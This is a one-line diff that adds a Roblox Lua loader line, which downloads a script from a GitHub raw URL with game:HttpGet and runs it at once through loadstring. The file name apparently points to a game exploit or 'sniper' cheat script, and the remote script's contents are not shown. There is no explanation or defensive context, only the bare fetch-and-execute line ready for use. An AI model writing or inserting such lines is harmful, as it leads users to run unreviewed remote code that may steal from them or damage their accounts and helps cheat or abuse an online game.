@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/event-sniper-arena-spam4-99ls0usfo326fn.lua"))()
